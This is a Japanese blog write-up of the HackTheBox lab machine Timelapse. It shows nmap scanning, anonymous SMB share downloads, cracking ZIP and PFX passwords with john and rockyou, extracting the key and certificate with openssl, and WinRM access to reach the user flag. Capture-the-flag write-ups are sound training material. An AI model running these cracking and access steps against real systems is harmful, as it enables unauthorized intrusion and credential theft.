+++
draft = false
date = '2025-12-19T23:27:02+09:00'
title = 'HTB: Timelapse'
tags = ['HackTheBox', 'Windows', 'Easy']
+++

## 概要
>  **Machine:** [Timelapse](https://www.hackthebox.com/machines/timelapse)  
>  **OS:** Windows  
>  **Difficulty:** Easy


## ポートスキャン

`Nmap`でポートスキャンします。

```bash
sudo nmap -sC -sV <RHOST>
```
![img](nmap.png)

### スキャン結果

Nmapスキャン結果から、以下のポートが開放されていることがわかります。

| Port | Service |  |
|------|---------|---------|
| 53/tcp | DNS |  |
| 88/tcp | Kerberos |  |
| 135/tcp | RPC |  |
| 139/tcp | NetBIOS |  |
| 389/tcp | LDAP |  |
| 445/tcp | SMB |  |
| 464/tcp | Kerberos |  |
| 593/tcp | RPC |  |
| 636/tcp | LDAP |  |
| 3268/tcp | LDAP |  |
| 3269/tcp | LDAP |  |
| 5986/tcp | WinRM |  |


## SMB列挙

`smbclient`で共有フォルダを一覧表示します。

```bash
smbclient -N -L <RHOST>
```

`Shares`と`SYSVOL`が見つかります。

![img](smbclient.png)

`Shares`にアクセスします。

```bash
smbclient -N //<RHOST>/Shares
```

`ls`コマンドで、`Dev`と`HelpDesk`の２つのフォルダが見つかりました。

`mget`コマンドで、`Shares`配下のファイルを一括ダウンロードします。

`exit`コマンドで接続を終了します。

## ZIPファイルのパスワード解析

`Dev`フォルダ配下に`winrm_backup.zip`が見つかります。ZIPファイルを展開してみようとすると、パスワード入力が求められます。

まずは、`zip2john`でパスワードハッシュを抽出します。

```bash
zip2john htb/timelapse/Dev/winrm_backup.zip > htb/timelapse/winrm_backup.hash
```

`John`でパスワードを解析します。ワードリストに`rockyou.txt`を使用します。

```bash
john --wordlist=/usr/share/wordlists/rockyou.txt htb/timelapse/winrm_backup.hash
```
パスワードは`supremelegacy`であることがわかりました。

![img](john.png)


## PFXファイルのパスワード解析

`winrm_backup.zip`を展開すると、PFXファイルが見つかります。
このPFXファイルもパスワードで保護されています。

`pfx2john`でパスワードハッシュを抽出します。

```bash
pfx2john htb/timelapse/legacyy_dev_auth.pfx > htb/timelapse/legacyy_dev_auth.hash
```

`John`でパスワードを解析します。ワードリストに`rockyou.txt`を使用します。

```bash
john --wordlist=/usr/share/wordlists/rockyou.txt htb/timelapse/legacyy_dev_auth.hash
```

パスワードは`thuglegacy`であることがわかりました。

![img](john2.png)


## 秘密鍵・公開鍵の抽出

```bash
openssl pkcs12 -in htb/timelapse/legacyy_dev_auth.pfx -nocerts -out htb/timelapse/legacyy_dev_auth.key
```

```bash
openssl pkcs12 -in htb/timelapse/legacyy_dev_auth.pfx -nokeys -out htb/timelapse/legacyy_dev_auth.cert
```

## WinRM経由での接続

![img](evil-winrm.png)

## userフラグの取得

```bash
type Desktop/user.txt
```